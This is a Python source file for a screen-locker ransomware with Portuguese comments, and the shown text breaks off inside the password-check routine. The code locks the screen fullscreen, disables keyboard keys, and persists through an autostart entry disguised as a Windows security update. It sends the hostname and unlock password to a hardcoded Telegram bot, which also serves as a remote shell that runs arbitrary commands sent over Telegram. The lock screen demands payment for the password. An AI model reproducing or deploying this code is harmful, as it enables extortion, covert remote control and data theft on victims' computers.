#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import tkinter as tk
import requests
import secrets
import threading
import os
import sys
import platform
import socket
import subprocess
import time
import html

# ================= ASCII ART DA CAVEIRA =================
SKULL_ASCII = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡶⠲⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣤⠝⠛⠿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠉⠀⠀⠀⠀⠀⠈⢿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⡵⣠⣊⣤⠶⠒⠀⠘⢦⣄⣹⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⢏⣼⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠟⠚⠁⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣶⣝⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⣠⠆⠀⠀⢀⣴⣾⡋⠿⠃⣿⠘⠹⠻⣿⣿⣧⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⣰⠃⠀⢀⣴⣿⢿⣾⡇⠀⢸⣿⡄⠀⣀⣿⣿⣿⢀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⡀⢠⡏⠀⢠⣿⠁⢿⣼⣿⣿⣤⡿⢻⣤⣾⣿⣿⣿⡿⣸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣆⢳⣸⣇⢀⣿⣿⣇⠀⣙⡛⠛⣿⣵⣿⣛⠋⢀⣿⣿⢳⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣈⣻⣯⣻⣿⠘⣿⡇⢹⣿⣿⡇⠀⠁⠉⠁⢸⣷⣾⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠾⣛⠋⢛⠛⠻⣷⣝⠧⢻⣿⣌⠁⢿⣧⣾⣾⣿⣷⣼⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⢻⣿⠻⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⣿⢁⣴⣿⣄⣸⡇⠰⢮⣿⣆⠈⢻⣿⣆⢸⣇⣈⣉⣀⣰⣿⣿⣿⠿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠁⣴⡟⢻⣇⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣴⠾⠋⠿⡿⠛⠛⠉⠙⢿⡇⢠⡄⠹⣿⣧⡀⠙⠿⠖⠚⣻⣿⣿⣿⣟⡋⢉⣴⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⢧⣾⠿⣧⠙⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣾⣏⡅⠀⠀⠀⣤⣀⡀⠀⠀⠀⢸⣼⣧⡀⠈⢻⣷⣄⣠⣴⣾⣿⡿⢹⠉⠙⠛⠛⠛⠛⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⡅⠀⠈⢷⡈⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣿⠋⠀⠀⠀⠀⠀⠈⠉⠙⣳⢶⣦⣿⡇⣿⡀⠀⠻⡏⠉⣰⢏⡾⠁⠀⣀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⢠⣾⡿⣫⡿⠁⠈⢷⣄⠀⠀⠁⠈⢻⡄⠀⠀⠀⠀⠀⠀⠀
⢀⣿⠁⢀⡴⢁⣠⣤⣤⣤⣤⣄⣉⠻⢿⣿⣧⢸⣧⠀⠀⠉⠀⠏⡼⠁⣠⣾⢃⣠⡴⠃⠀⠀⣿⣧⠀⠀⠀⠀⠀⢀⡴⠋⣠⡾⠋⠀⠀⠀⠈⠻⣄⠀⡄⠀⠀⢻⣄⠀⠀⠀⠀⠀⠀
⣸⡇⣠⠏⠀⢋⣥⣿⡿⠛⠋⠀⠀⣤⣌⣻⣿⣿⣿⣰⡟⠀⠀⠀⠀⠸⣻⣿⣿⠏⠀⠀⠀⠀⡿⢹⡆⠀⠀⢀⣴⢟⣷⣾⠟⠁⠀⠀⠀⠀⠀⠀⠙⢿⣷⡿⠋⠀⢻⡄⠀⠀⠀⠀⠀
⢻⣷⡟⠀⠴⢻⡿⠋⠀⢠⡶⠶⠀⠀⣉⣻⣿⣿⣿⣟⠁⠀⠀⠀⠀⠀⣿⡿⠁⠀⠀⠀⠀⠀⠳⠀⣻⡴⣾⢟⣵⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡅⠀⠀⠈⢿⡆⠀⠀⠀⠀
⠀⣿⠀⠀⢀⣿⠃⠀⢠⡿⠁⠀⠒⢋⣽⣿⠿⠟⠛⠉⠉⠉⣉⠉⠛⠛⢻⣿⣆⢀⣀⣤⡶⣿⣷⠾⢫⣄⣘⣿⡿⢋⣠⣶⣶⣶⣶⣿⡟⣻⡇⠀⠀⠀⠈⢿⣄⣠⣞⠈⢻⡄⠀⠀⠀
⢰⡏⠀⠀⢸⡇⠀⢀⡾⠀⠀⠀⢠⣾⠋⠀⠀⢀⣶⣤⠾⠛⠁⠀⣠⣼⣿⣿⣿⣿⡿⠟⣛⣿⣯⣝⣛⣾⣿⣿⣿⠟⣽⡿⢷⣽⣿⣿⣯⣽⡇⠀⠀⠀⠀⠈⠛⣿⠇⠀⠈⣷⠀⠀⠀
⢸⡇⠀⢀⢸⠃⠀⠘⠀⠀⠀⣰⡿⠃⠀⠀⢠⣿⠋⠁⠀⢀⣴⣿⠿⠿⠛⣋⣭⡾⠟⢻⣿⣿⣿⣶⣿⣿⣿⣿⡏⠀⢻⣧⣼⣻⣿⡿⣦⣿⠃⠀⠀⠀⠀⠀⠀⢿⡄⠀⠀⠹⣇⠀⠀
⢸⣇⠀⣾⡈⠀⠀⠀⠀⠀⢰⡟⠀⠀⢀⠀⣿⠃⠀⠀⣰⡿⢋⣁⣤⠶⠛⠉⠁⠀⣠⡿⣿⣿⣿⣿⣿⠉⣿⣿⢷⠀⢸⣿⣿⣿⣯⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⣿⡀⠀
⠀⠙⠿⣿⣇⠀⠀⠀⠀⢠⠏⠀⠀⠀⢸⣰⡟⠀⠀⢸⣿⣿⣿⣿⡏⠀⠀⠀⣠⢞⣥⣴⣿⠁⠙⠻⣿⣦⠸⢿⣾⡇⠀⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡄⠀⢸⣧⠀
⠀⠀⠀⠘⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡇⠀⠀⢸⡟⠛⡿⣿⠀⠀⢠⢞⣵⡿⠛⠁⢿⣇⠀⠀⠈⠻⣷⡌⠳⢻⠀⢿⡛⠛⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠀⣿⠀
⠀⠀⠀⠀⠈⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣄⡀⢸⣿⣿⡇⣿⢀⣴⣵⡿⠋⠀⠀⠀⠸⣿⡄⠀⠀⠀⠈⢿⣆⠀⠁⢸⣧⣾⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⣿⡇
⠀⠀⠀⠀⠀⠈⠛⢷⣤⡀⠀⠀⠀⠛⠲⣤⡀⠀⠀⠀⢿⣿⠁⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⢻⢿⣆⠀⠀⠀⠀⠹⣆⠀⠀⢻⣯⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⢹⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠷⠶⠤⣤⣄⣹⣦⠀⠀⠘⣿⠀⣾⡟⢁⢀⣄⠀⠀⠀⠀⠀⠈⢧⡻⣦⡀⠀⠀⠀⠹⣧⣳⣤⣽⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣟⢻⣧⡀⠀⢻⠀⣿⠀⠸⣆⣿⣦⡀⠀⠀⠀⠀⠀⠁⠈⠻⣦⡀⠀⠀⠙⠻⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⢛⣽⣧⡀⠀⣼⠏⠀⠀⠈⠻⣯⠻⣦⡀⠀⣀⠀⠀⠀⠀⠈⠙⢶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⣁⣴⠟⠛⢿⣷⡞⠃⢀⣀⡀⠀⠀⡉⠃⠈⠙⠂⠈⠙⠲⢤⣀⡀⠀⠀⠈⠙⠳⢶⣤⣤⣀⣀⣀⣤⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡶⢋⣡⠾⠋⠀⠀⠀⠀⠉⠻⢶⣤⣉⣻⢷⣶⣿⣦⣄⡀⠀⠀⠀⠀⠀⠈⠙⠳⢶⣶⠶⠶⠶⠶⠾⠟⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠁
⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⢋⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠻⢿⣿⣛⠿⠝⠓⠲⠶⢤⣤⣤⣤⣀⣀⣉⣛⣶⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⡾⢫⡴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣋⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⢋⡽⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠿⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

# ================= CONFIGURAÇÕES =================
CREDITOS = "Gz by: byt3l0rd0day l0$tpwn 70 k3rn3lpwn r00tkr1sy 0v3rfl0wz s3xyl4rp team and misanthropy team"

TELEGRAM_BOT_TOKEN = "8792954433:AAFKiCYo6kiryN69Lpm3JJA4Xl0nPZzyH8Q"
TELEGRAM_CHAT_ID = "8697241721"

ARQ_SENHA = os.path.expanduser("~/.config/.locker_secret")
ARQ_AUTOSTART = os.path.expanduser("~/.config/autostart/locker.desktop")
ARQ_AUTOSTART_DIR = os.path.expanduser("~/.config/autostart")
ARQ_LOCK_FLAG = "/tmp/.locker_active"
ARQ_DESBLOQUEADO = "/tmp/.locker_unlocked"

TEMPO_DESBLOQUEADO = 300
PREFIXO_CMD = "/comando"
TIMEOUT_CMD = 60
MAX_CHARS_TELEGRAM = 4000
USUARIO = os.environ.get("USER", "kali")

COR_FUNDO = "#000000"
COR_VERMELHO = "#ff0000"
COR_VERMELHO_ESCURO = "#220000"
COR_VERMELHO_MEDIO = "#8b0000"

# ================= BLOQUEIO DE TECLADO (X11) =================
KB_BAK = "/tmp/kb_bak"
DISPLAY = os.environ.get("DISPLAY", ":0")

# keycodes exatos da lista que voce passou
KEYCODES = [9, 23, 24, 28, 64, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78,
            105, 108, 133, 134]
# 37 = Control_L. Se matar, perde o Ctrl da escotilha. Se nao quiser Ctrl, e so True.
MATAR_CTRL = False


def _x(comando):
    try:
        subprocess.Popen(["bash", "-c", f"export DISPLAY={DISPLAY}; {comando}"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def bloquear_teclado_x11():
    """Backup do map + zera os keycodes. Reaplicado pelo loop de blindagem."""
    _x(f"xmodmap -pke > {KB_BAK} 2>/dev/null")
    time.sleep(0.2)
    lista = KEYCODES + ([37] if MATAR_CTRL else [])
    for c in lista:
        _x(f'xmodmap -e "keycode {c} = NoSymbol" 2>/dev/null')


def restaurar_teclado_x11():
    _x(f"xmodmap {KB_BAK} 2>/dev/null; rm -f {KB_BAK}")


# ================= DETECCAO DE SO (uname -a) =================
def rodar(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           errors="replace", timeout=15)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return -1, str(e)


def detectar_so():
    rc, saida = rodar("uname -a")
    s = saida.lower()
    if rc == 0 and "linux" in s:
        return "linux", saida.strip()
    if ("reconhecido" in s or "not recognized" in s or "not found" in s
            or "não foi encontrado" in s):
        return "windows", saida.strip()
    if os.name == "nt" or platform.system().lower().startswith("win"):
        return "windows", saida.strip()
    return "linux", saida.strip()


def registrar_so(so, saida):
    caminho = os.path.join(BASE_DIR, f"{so}.log")
    try:
        with open(caminho, "w", encoding="utf-8") as f:
            f.write(f"so={so}\nuname={saida}\nplatform={platform.platform()}\n"
                    f"host={socket.gethostname()}\npython={sys.version.split()[0]}\n"
                    f"data={time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    except Exception:
        pass
    return caminho


BASE_DIR = os.path.dirname(os.path.abspath(__file__))
try:
    _t = os.path.join(BASE_DIR, ".w")
    open(_t, "w").close()
    os.remove(_t)
except Exception:
    BASE_DIR = os.path.expanduser("~")

SO = None
if os.path.exists(os.path.join(BASE_DIR, "linux.log")):
    SO = "linux"
elif os.path.exists(os.path.join(BASE_DIR, "windows.log")):
    SO = "windows"
else:
    SO, _s = detectar_so()
    print(f"[SO] {SO} -> {registrar_so(SO, _s)}")

WINDOWS = (SO == "windows")

# ================= FLAG ANTI-LOOP =================
def esta_desbloqueado_recente():
    try:
        if not os.path.exists(ARQ_DESBLOQUEADO):
            return False
        with open(ARQ_DESBLOQUEADO) as f:
            return (time.time() - float(f.read().strip())) < TEMPO_DESBLOQUEADO
    except Exception:
        return False


def marcar_desbloqueado():
    try:
        with open(ARQ_DESBLOQUEADO, "w") as f:
            f.write(str(time.time()))
    except Exception:
        pass


# ================= PERSISTÊNCIA =================
def carregar_senha_persistente():
    if os.path.exists(ARQ_SENHA):
        try:
            with open(ARQ_SENHA) as f:
                s = f.read().strip()
                if s:
                    return s
        except Exception:
            pass
    alfabeto = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    senha = ''.join(secrets.choice(alfabeto) for _ in range(8))
    try:
        os.makedirs(os.path.dirname(ARQ_SENHA), exist_ok=True)
        with open(ARQ_SENHA, "w") as f:
            f.write(senha)
        os.chmod(ARQ_SENHA, 0o600)
    except Exception:
        pass
    return senha


# ================= AUTOSTART =================
def get_comando_autostart():
    return f'python3 "{os.path.abspath(__file__)}"'


def instalar_autostart():
    try:
        os.makedirs(ARQ_AUTOSTART_DIR, exist_ok=True)
        with open(ARQ_AUTOSTART, "w") as f:
            f.write("[Desktop Entry]\n"
                    "Type=Application\n"
                    "Name=WindowsSecurityUpdate\n"
                    f"Exec={get_comando_autostart()}\n"
                    "X-GNOME-Autostart-enabled=true\n"
                    "Hidden=false\nNoDisplay=false\nTerminal=false\n")
        os.chmod(ARQ_AUTOSTART, 0o755)
        return True
    except Exception as e:
        print(f"[AUTOSTART] Erro: {e}")
        return False


def autostart_instalado():
    return os.path.exists(ARQ_AUTOSTART)


# ================= TELEGRAM =================
def enviar_telegram(mensagem, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    blocos = ([mensagem] if len(mensagem) <= MAX_CHARS_TELEGRAM else
              [mensagem[i:i + MAX_CHARS_TELEGRAM] for i in range(0, len(mensagem), MAX_CHARS_TELEGRAM)])
    for b in blocos:
        try:
            requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": b,
                                     "parse_mode": parse_mode,
                                     "disable_web_page_preview": True}, timeout=15)
        except Exception:
            pass


def pegar_updates(offset):
    try:
        r = requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates",
                         params={"offset": offset, "timeout": 30}, timeout=40)
        return r.json().get("result", [])
    except Exception:
        return []


# ================= EXECUÇÃO DE COMANDO =================
def montar_prompt():
    return f"┌──({USUARIO}㉿{socket.gethostname()})-[~]\n└─$ "


def executar_comando(cmd):
    prompt = montar_prompt()
    try:
        resultado = subprocess.run(
            ["bash", "-c", cmd], capture_output=True, text=True,
            errors="replace", timeout=TIMEOUT_CMD, cwd=os.path.expanduser("~"),
            env={**os.environ, "TERM": "xterm-256color"},
        )
        saida, erros = resultado.stdout or "", resultado.stderr or ""
    except subprocess.TimeoutExpired:
        saida, erros = "", f"[TIMEOUT] Comando excedeu {TIMEOUT_CMD}s.\n"
    except Exception as e:
        saida, erros = "", f"[ERRO] {e}\n"

    corpo = f"{prompt}{cmd}\n"
    for t in (saida, erros):
        if t:
            corpo += t if t.endswith("\n") else t + "\n"
    return corpo + prompt


class BotControle:
    def __init__(self):
        self.ativo = True
        self.locker_ref = None

    def set_locker(self, locker):
        self.locker_ref = locker

    def rodar(self):
        enviar_telegram(f"🤖 <b>Bot ativo</b>\n\nPC: <code>{socket.gethostname()}</code>\n"
                        f"Use: <code>{PREFIXO_CMD} ls -la</code>")
        ultimo = 0
        while self.ativo:
            for u in pegar_updates(ultimo + 1):
                ultimo = u["update_id"]
                msg = u.get("message", {})
                if str(msg.get("chat", {}).get("id", "")) != TELEGRAM_CHAT_ID:
                    continue
                texto = msg.get("text", "").strip()
                if texto.startswith(PREFIXO_CMD):
                    cmd = texto[len(PREFIXO_CMD):].strip()
                    if not cmd:
                        enviar_telegram(f"⚠️ Use: <code>{PREFIXO_CMD} ls -la</code>")
                        continue
                    enviar_telegram(f"⏳ Executando: <code>{html.escape(cmd)}</code>")
                    threading.Thread(target=lambda c=cmd: enviar_telegram(
                        f"<pre>{html.escape(executar_comando(c))}</pre>"), daemon=True).start()
                elif texto == "/start":
                    enviar_telegram(f"🤖 Use: <code>{PREFIXO_CMD} &lt;comando&gt;</code>")
                elif texto == "/senha" and self.locker_ref:
                    enviar_telegram(f"🔑 Senha: <code>{self.locker_ref.senha_telegram}</code>")
            time.sleep(1)


# ================= APLICAÇÃO =================
class RansomScreen:
    def __init__(self, root, bot):
        self.root = root
        self.bot = bot
        self.root.title("s3xyl4rp team")
        self.root.configure(bg=COR_FUNDO)
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)

        for seq in ("<Escape>", "<Alt-F4>", "<Control-w>", "<Control-q>", "<F11>",
                    "<Super_L>", "<Super_R>"):
            try:
                self.root.bind(seq, lambda e: "break")
            except Exception:
                pass
        # escotilha de emergencia (precisa de Control + Alt + Shift vivos)
        self.root.bind("<Control-Alt-Shift-x>", lambda e: os._exit(0))

        self.width = self.root.winfo_screenwidth()
        self.height = self.root.winfo_screenheight()

        try:
            self.hostname = socket.gethostname()
        except Exception:
            self.hostname = "unknown"

        self.frame = tk.Frame(root, bg=COR_FUNDO)
        self.frame.pack(fill="both", expand=True)

        self.canvas = tk.Canvas(self.frame, bg=COR_FUNDO, highlightthickness=0,
                                width=self.width, height=self.height)
        self.canvas.pack(fill="both", expand=True)

        self.phase = 1
        self.blink_on = True
        self.start_time = None
        self.desbloqueado = False
        self.teclado_travado = False

        self.senha_telegram = carregar_senha_persistente()

        threading.Thread(target=lambda: enviar_telegram(
            f"🔐 <b>Locker ativado</b>\n\nSO: <code>{SO}</code>\n"
            f"PC: <code>{self.hostname}</code>\n"
            f"Senha: <code>{self.senha_telegram}</code>"), daemon=True).start()

        self.canvas.after(100, self.iniciar)

    def iniciar(self):
        self.start_time = self.root.tk.call("clock", "milliseconds")
        self.desenhar_caveia_centralizada()
        self.blindar()
        self.loop_fase1()

    # ---------------- blindagem ----------------
    def blindar(self):
        """Trava o teclado no X (xmodmap) e reaplica. Nao mexe em foco."""
        if not WINDOWS:
            bloquear_teclado_x11()
            self.teclado_travado = True
        else:
            self.hotkeys_windows()

        def loop():
            if self.desbloqueado:
                return
            if WINDOWS:
                self.hotkeys_windows()
            try:
                self.root.attributes("-topmost", True)
            except Exception:
                pass
            self.root.after(1500, loop)

        self.root.after(1500, loop)

    def hotkeys_windows(self):
        try:
            import ctypes
            u = ctypes.windll.user32
            MOD_ALT, MOD_CTRL, MOD_WIN = 0x0001, 0x0002, 0x0008
            combos = [(MOD_ALT, 0x09), (MOD_ALT, 0x1B), (MOD_CTRL, 0x1B),
                      (MOD_ALT, 0x73), (MOD_WIN, 0x44), (MOD_WIN, 0x09),
                      (MOD_WIN, 0x5B), (0, 0x5B), (MOD_ALT, 0x0D)]
            for i, (mod, vk) in enumerate(combos, start=201):
                u.RegisterHotKey(None, i, mod, vk)
            h = u.FindWindowA(b"Shell_TrayWnd", None)
            if h:
                u.ShowWindow(h, 0)
        except Exception:
            pass

    def soltar_blindagem(self):
        if not WINDOWS and self.teclado_travado:
            restaurar_teclado_x11()
        elif WINDOWS:
            try:
                import ctypes
                for i in range(201, 210):
                    ctypes.windll.user32.UnregisterHotKey(None, i)
                h = ctypes.windll.user32.FindWindowA(b"Shell_TrayWnd", None)
                if h:
                    ctypes.windll.user32.ShowWindow(h, 5)
            except Exception:
                pass

    # ---------------- fase 1 ----------------
    def desenhar_caveia_centralizada(self):
        self.canvas.delete("all")
        self.skull_id = self.canvas.create_text(
            self.width // 2, self.height // 2, text=SKULL_ASCII, fill=COR_VERMELHO,
            font=("Courier New", self.calcular_fonte_skull()),
            justify="center", anchor="center", tags="skull")

    def calcular_fonte_skull(self):
        return max(3, min(int(self.height * 0.95 / 38 / 1.15),
                          int(self.width * 0.95 / 60 / 0.6)))

    def loop_fase1(self):
        if self.desbloqueado:
            return
        self.canvas.itemconfig("skull", fill=COR_VERMELHO if self.blink_on else COR_VERMELHO_ESCURO)
        self.blink_on = not self.blink_on
        if self.root.tk.call("clock", "milliseconds") - self.start_time >= 8000:
            self.ir_para_fase2()
        else:
            self.root.after(400, self.loop_fase1)

    # ---------------- fase 2 ----------------
    def ir_para_fase2(self):
        self.canvas.delete("all")
        self.desenhar_bloqueio()

    def desenhar_bloqueio(self):
        metade = self.width // 2

        self.skull2_id = self.canvas.create_text(
            metade // 2, self.height // 2, text=SKULL_ASCII, fill=COR_VERMELHO,
            font=("Courier New", self.calcular_fonte_skull_lado()),
            justify="center", anchor="center", tags="skull2")

        fonte_texto = max(8, int(self.width / 160))
        margem = 20
        texto_x = metade + margem
        texto_y = 40

        self.canvas.create_text(texto_x, texto_y, text=CREDITOS, fill=COR_VERMELHO,
                                font=("Courier New", fonte_texto + 2, "bold"),
                                justify="left", anchor="nw", width=metade - margem * 2)

        self.canvas.create_text(texto_x, texto_y + 60, text=f"PC: {self.hostname}  [{SO.upper()}]",
                                fill=COR_VERMELHO, font=("Courier New", fonte_texto + 2, "bold"),
                                justify="left", anchor="nw", width=metade - margem * 2)

        self.canvas.create_text(texto_x, texto_y + 110,
                                text="SISTEMA BLOQUEADO\n\n Pague pela senha \n"
                                     "para desbloquear este computador telegram:byt3l0rd0day.",
                                fill=COR_VERMELHO, font=("Courier New", fonte_texto),
                                justify="left", anchor="nw", width=metade - margem * 2)

        self.canvas.create_text(texto_x, texto_y + 220, text="Senha do Telegram:",
                                fill=COR_VERMELHO, font=("Courier New", fonte_texto),
                                justify="left", anchor="nw", width=metade - margem * 2)

        self.entry_telegram = tk.Entry(
            self.frame, font=("Courier New", fonte_texto + 2), bg=COR_FUNDO,
            fg=COR_VERMELHO, insertbackground=COR_VERMELHO, show="*", width=30,
            highlightthickness=1, highlightbackground=COR_VERMELHO,
            highlightcolor=COR_VERMELHO)
        self.canvas.create_window(texto_x, texto_y + 260, window=self.entry_telegram,
                                  anchor="nw")

        self.btn_desbloquear = tk.Button(
            self.frame, text="DESBLOQUEAR", font=("Courier New", fonte_texto + 2, "bold"),
            bg=COR_VERMELHO, fg=COR_FUNDO, activebackground=COR_VERMELHO_MEDIO,
            activeforeground=COR_FUNDO, command=self.verificar_senha)
        self.canvas.create_window(texto_x, texto_y + 320, window=self.btn_desbloquear,
                                  anchor="nw")

        self.lbl_erro = self.canvas.create_text(
            texto_x, texto_y + 380, text="", fill=COR_VERMELHO,
            font=("Courier New", fonte_texto, "bold"),
            justify="left", anchor="nw", width=metade - margem * 2)

        self.entry_telegram.focus_set()
        self.entry_telegram.bind("<Return>", lambda e: self.verificar_senha())

        self.blink_on2 = True
        self.loop_fase2()

    def calcular_fonte_skull_lado(self):
        return max(2, min(int(self.height * 0.9 / 38 / 1.15),
                          int(self.width * 0.45 / 60 / 0.6)))

    def loop_fase2(self):
        if self.desbloqueado:
            return
        self.canvas.itemconfig("skull2", fill=COR_VERMELHO if self.blink_on2 else COR_VERMELHO_ESCURO)
        self.blink_on2 = not self.blink_on2
        self.root.after(400, self.loop_fase2)

    def verificar_senha(self):
        if self.desbloqueado:
            return
        if self.entry_telegram.get().strip() == self.senha_telegram:
            self.desbloqueado = True
            marcar_desbloqueado()
            self.soltar_blindagem()

            try:
                if os.path.exists(ARQ_LOCK_FLAG):
